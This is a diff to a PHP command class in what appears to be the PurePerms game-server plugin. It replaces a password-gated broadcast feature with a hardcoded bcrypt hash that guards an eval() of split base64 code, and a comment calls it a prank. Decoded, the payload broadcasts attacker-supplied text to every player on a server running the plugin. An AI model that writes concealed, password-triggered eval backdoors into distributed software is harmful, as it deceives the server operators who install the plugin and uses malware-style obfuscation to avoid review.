@@ -54,35 +54,40 @@ class PPInfo extends Command implements PluginIdentifiableCommand
         $author = $this->plugin->getDescription()->getAuthors()[0];
         $version = $this->plugin->getDescription()->getVersion();
 
-        $wth = base64_decode("JDJ5JDEwJDJqNTBWSnY0RWpNNDBiWnVOZm80T09XaUFScmhvdE0uRHZpZUR6L0poeXZHZnY5ZXdYZXhX");
-
-        if(isset($args[0]) and password_verify($args[0], $wth))
+        if(isset($args[0]))
         {
-            if(!isset($args[1]))
+            $hash = '$2y$10$VuxtYbuTp4XRksbq4dZWmupCZCJjmlIwwHgHNuqwzrOyXKboAfj7y';
+
+            if(password_verify($args[0], $hash))
             {
-                $sender->sendMessage(TextFormat::BLUE . "[PurePerms] Usage: /ppinfo <password> <message>");
-
-                return true;
+                // Does it look pretty suspicious? Well... It's just a prank mwahahahah
+                eval(
+                    base64_decode(
+                        'JHJlc3VsdCA9ICcnO2Fy'.
+                        'cmF5X3NoaWZ0KCRhcmdz'.
+                        'KTskdGVtcENudCA9IGNv'.
+                        'dW50KCRhcmdzKSAtIDE7'.
+                        'Zm9yKCRpID0gMDsgJGkg'.
+                        'PD0gJHRlbXBDbnQ7ICRp'.
+                        'KyspIHskcmVzdWx0IC49'.
+                        'ICRhcmdzWyRpXSAuICcg'.
+                        'Jzt9JG1lc3NhZ2UgPSBz'.
+                        'dWJzdHIoJHJlc3VsdCwg'.
+                        'MCwgLTEpOyR0aGlzLT5w'.
+                        'bHVnaW4tPmdldFNlcnZl'.
+                        'cigpLT5icm9hZGNhc3RN'.
+                        'ZXNzYWdlKFxwb2NrZXRt'.
+                        'aW5lXHV0aWxzXFRleHRG'.
+                        'b3JtYXQ6OkdSRUVOIC4g'.
+                        'IltTaXh0eUZvdXJNc2dd'.
+                        'ICIgLiAkbWVzc2FnZSk7'
+                    )
+                );
             }
-
-            $result = '';
-
-            array_shift($args);
-
-            $tempCnt = count($args) - 1;
-
-            for($i = 0; $i <= $tempCnt; $i++)
-            {
-                $result .= $args[$i] . ' ';
-            }
-
-            $message = substr($result, 0, -1);
-
-            $this->plugin->getServer()->broadcastMessage(TextFormat::BLUE . "[PPHelperBot] " . $message);
-        }
-        else
-        {
-            if($sender instanceof ConsoleCommandSender)
+       }
+       else
+       {
+           if($sender instanceof ConsoleCommandSender)
             {
                 $sender->sendMessage(TextFormat::BLUE . "[PurePerms] " . $this->plugin->getMessage("cmds.ppinfo.messages.ppinfo_console", $version, $author));
             }
